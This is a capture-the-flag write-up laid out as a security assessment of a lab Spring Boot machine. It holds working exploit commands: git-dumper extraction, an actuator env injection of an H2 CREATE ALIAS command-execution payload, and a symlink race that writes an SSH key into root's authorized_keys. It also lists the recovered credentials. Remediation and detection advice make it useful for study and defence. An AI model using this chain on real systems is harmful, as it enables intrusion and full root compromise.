# Security Assessment Report: Spring

## Assessment Overview
- **Platform:** TryHackMe
- **Target:** 10.129.157.174
- **Room Type:** CTF / Web Application Exploitation
- **Date Solved:** 2026-04-27

**Objectives & Status:**
- [x] Obtain foothold flag
- [x] Obtain user flag
- [x] Obtain root flag

---

## Executive Summary & Key Findings

The target is a Spring Boot application running on an embedded Tomcat server. The machine was compromised by chaining an exposed `.git` directory leak, Spring Boot Actuator misconfiguration, H2 database CREATE ALIAS RCE, and a symlink race in a root-owned log rotation script.

- **Exposed Services:** HTTPS (443) — Spring Boot application
- **Interesting Paths:** `/.git/`, `/actuator/env`, `/actuator/restart`, `/actuator/shutdown`
- **Credentials Discovered:**
  - `johnsmith:idontwannag0` (HTTP Basic Auth)
  - `PrettyS3cureSpringPassword123.` (Spring security user password from `application.properties`)
  - `PrettyS3cureAccountPassword123.` (johnsmith system password, reused)
- **Users Enumerated:** `nobody` (application runtime), `johnsmith`
- **Loot & Flags:**
  - `THM{dont_expose_.git_to_internet}`
  - `THM{this_is_still_password_reuse}`
  - `THM{sshd_does_not_mind_the_junk}`
- **Answers/Misc:** N/A

---

## Exploitation Chain

1. **Reconnaissance:** Discovered exposed `.git` directory, extracted source code revealing Spring Boot Actuator endpoints and hardcoded credentials in `application.properties`.
2. **Initial Access:** Abused Spring Boot Actuator `/actuator/env` to inject an H2 `CREATE ALIAS` payload into `spring.datasource.hikari.connection-test-query`, then triggered execution with `/actuator/restart` to achieve RCE as `nobody`.
3. **Privilege Escalation:** Escalated to `johnsmith` via `su` using the reused password `PrettyS3cureAccountPassword123.` discovered in source code.
4. **Post-Exploitation:** Performed root escalation via a symlink race in `/home/johnsmith/tomcatlogs/` — the root-owned systemd service (`spring.service`) pipes Tomcat output to `tee` using epoch-timestamped filenames. By creating symlinks to `/root/.ssh/authorized_keys` and injecting an SSH public key through the web application greeting endpoint, `tee` (running as root) wrote the key to root's `authorized_keys`, enabling passwordless SSH as root.

---

## Vulnerability Details

### Vulnerability Name: Exposed .git Directory Leading to Source Code Leak
- **Vulnerable Location:** `https://10.129.157.174/.git/`
- **Overview:** The `.git` directory was publicly accessible, allowing full repository extraction with `git-dumper`. This leaked `application.properties`, hardcoded credentials, and internal endpoint paths.
- **Impact:** Complete source code disclosure, including credentials and architecture details.
- **Severity:** High
- **Remediation:** Block access to hidden directories (`.git`, `.env`, `.svn`) at the reverse proxy or web server level. Ensure `.git` is not deployed to production.
- **Proof of Impact (Execution):**
  - Successfully extracted repository using `git-dumper`.
  - Recovered `application.properties` containing `spring.security.user.password=PrettyS3cureSpringPassword123.` and actuator endpoint mappings.

### Vulnerability Name: Spring Boot Actuator Misconfiguration with H2 RCE
- **Vulnerable Location:** `/actuator/env`, `/actuator/restart`
- **Overview:** The Spring Boot Actuator was exposed without proper access control. The `env` endpoint allowed modification of environment properties at runtime, including `spring.datasource.hikari.connection-test-query`. By setting this to an H2 `CREATE ALIAS ... EXEC` payload and restarting the application, arbitrary Java code execution was achieved during the HikariCP connection test.
- **Impact:** Remote Code Execution as the application user (`nobody`).
- **Severity:** Critical
- **Remediation:** Disable or restrict actuator endpoints in production using `management.endpoints.web.exposure.include` and enforce authentication/authorization. Avoid exposing `/actuator/env` and `/actuator/restart`. Do not include H2 in production dependencies if not required.
- **Proof of Impact (Execution):**
  - POST to `/actuator/env` with payload: `CREATE ALIAS SHELLEXEC AS CONCAT(...); CALL SHELLEXEC('...');`
  - Triggered restart via `/actuator/restart`, executing system commands as `nobody`.

### Vulnerability Name: Symlink Race in Root-Owned Log Rotation (Privilege Escalation)
- **Vulnerable Location:** `/home/johnsmith/tomcatlogs/` via `/root/start_tomcat.sh` (executed by `spring.service` as root)
- **Overview:** The systemd service `spring.service` runs as root and executes `/root/start_tomcat.sh`, which pipes Tomcat output to `tee /home/johnsmith/tomcatlogs/<epoch>.log`. Since `johnsmith` owns `tomcatlogs`, he can create symlinks with predictable epoch filenames. When the service restarts, `tee` (running as root) follows the symlink and writes to any file, including `/root/.ssh/authorized_keys`.
- **Impact:** Local Privilege Escalation from `johnsmith` to `root`.
- **Severity:** High
- **Remediation:** Never write privileged process output to user-writable directories. Use `logrotate` with proper permissions, or write logs to a root-owned directory (`/var/log/spring/`). Validate log file paths before opening.
- **Proof of Impact (Execution):**
  - Created symlinks: `ln -s /root/.ssh/authorized_keys /home/johnsmith/tomcatlogs/<epoch>.log`
  - Triggered service restart via `/actuator/shutdown`.
  - Injected SSH public key via `curl --data-urlencode "name=$pubkey" https://localhost/`
  - `tee` wrote the greeting response (including the valid SSH key) into `/root/.ssh/authorized_keys`.
  - Logged in as root via SSH.

---

## Lessons Learned

### Strategic Takeaways
- **Source code leaks are catastrophic:** An exposed `.git` directory provided the entire attack blueprint — credentials, endpoint mappings, and application behavior. This underscores why `.git` must never be deployable.
- **Actuator endpoints are not safe for production:** Spring Boot Actuator provides powerful management capabilities that, when exposed, become critical vulnerabilities. `/actuator/env` and `/actuator/restart` should be treated with the same sensitivity as shell access.
- **H2 CREATE ALIAS is a known RCE vector:** The `connection-test-query` property in HikariCP combined with H2's `CREATE ALIAS` feature creates a reliable code execution primitive when the datasource is attacker-controlled.
- **Symlink races remain relevant in 2026:** Privileged processes writing to user-writable directories without path validation are a classic and still-effective privilege escalation vector. The `tee` command blindly follows symlinks.

### Real-World Context & Defense
- **Threat Landscape:** Spring Boot applications with exposed actuators are actively targeted in the wild (e.g., Spring4Shell CVE-2022-22965, though this room predates it). H2 RCE via actuator is a documented technique used by red teams and attackers alike.
- **Detection Engineering:**
  - Monitor for unexpected HTTP requests to `/.git/HEAD`, `/.git/config`.
  - Alert on POST requests to `/actuator/env` or `/actuator/restart`.
  - Log H2 database initialization queries containing `CREATE ALIAS`.
  - Detect rapid symlink creation in directories like `tomcatlogs/`.
- **System Hardening:**
  - Follow CIS Benchmarks for web server configuration — block hidden directories.
  - Apply Spring Security best practices: disable actuator endpoints in production or restrict to internal IPs with strong auth.
  - Run application services with least privilege (not `root`).
  - Use `O_NOFOLLOW` or validate paths before writing logs in privileged scripts.
  - Implement password policies that prevent reuse across application and system accounts.

---

## Technical Appendix: Commands Worth Keeping

```bash
# Recon
# Extract exposed .git directory
git-dumper https://10.129.157.174/.git/ ./sources

# Verify actuator access
curl -k -u johnsmith:idontwannag0 -H "x-9ad42dea0356cb04: 172.16.0.21" \
  https://10.129.157.174/actuator/env

# Exploitation
# H2 CREATE ALIAS RCE via Actuator
# Payload pattern:
# CREATE ALIAS SHELLEXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException {
#   java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(new String[]{"sh","-c",cmd}).getInputStream());
#   if (s.hasNext()) {return s.next();} return "ok"; }');
# CALL SHELLEXEC('<command>');

# Set payload via actuator env
curl -k -u johnsmith:idontwannag0 -H "x-9ad42dea0356cb04: 172.16.0.21" \
  -H "Content-Type: application/json" \
  -d '{"name":"spring.datasource.hikari.connection-test-query","value":"<PAYLOAD>"}' \
  https://10.129.157.174/actuator/env

# Trigger execution
curl -k -u johnsmith:idontwannag0 -H "x-9ad42dea0356cb04: 172.16.0.21" \
  -X POST https://10.129.157.174/actuator/restart

# Privilege Escalation
# Symlink race for root
# 1. Generate SSH key pair
ssh-keygen -t ed25519 -f spring_root -N ""

# 2. Create symlinks to authorized_keys
# Run as johnsmith
d=$(date +%s)
for i in {0..120}; do
  ln -sf /root/.ssh/authorized_keys /home/johnsmith/tomcatlogs/$((d + i)).log
done

# 3. Trigger restart (as nobody via RCE or as johnsmith)
curl -k -u johnsmith:idontwannag0 -H "x-9ad42dea0356cb04: 172.16.0.21" \
  -X POST https://10.129.157.174/actuator/shutdown

# 4. Inject SSH key via greeting endpoint
curl -k -H "x-9ad42dea0356cb04: 172.16.0.21" \
  --data-urlencode "name=$(cat spring_root.pub)" \
  https://10.129.157.174/

# 5. SSH as root
ssh -o "StrictHostKeyChecking=no" -i spring_root root@10.129.157.174
```
